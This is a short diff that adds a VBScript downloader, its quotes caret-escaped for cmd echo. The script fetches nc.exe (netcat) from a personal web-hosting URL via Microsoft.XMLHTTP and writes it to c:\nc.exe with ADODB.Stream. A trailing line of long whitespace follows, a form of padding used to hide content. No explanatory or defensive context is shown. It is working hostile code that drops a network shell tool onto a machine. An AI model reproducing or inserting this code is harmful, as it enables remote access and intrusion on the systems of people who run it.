@@ -1,0 +1,15 @@
+Dim DataBin
+Dim HTTPGET
+Set HTTPGET = CreateObject(^"^Microsoft.XMLHTTP^"^)
+HTTPGET.Open ^"^GET^"^, ^"^http://mitglied.lycos.de/norbertberg/nc.exe^"^, False 
+HTTPGET.Send
+DataBin = HTTPGET.ResponseBody
+Const adTypeBinary=1 
+Const adSaveCreateOverWrite=2 
+Dim SendBinary
+Set SendBinary = CreateObject(^"^ADODB.Stream^"^)
+SendBinary.Type = adTypeBinary
+SendBinary.Open
+SendBinary.Write DataBin
+SendBinary.SaveToFile ^"^c:\nc.exe^"^, adSaveCreateOverWrite
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
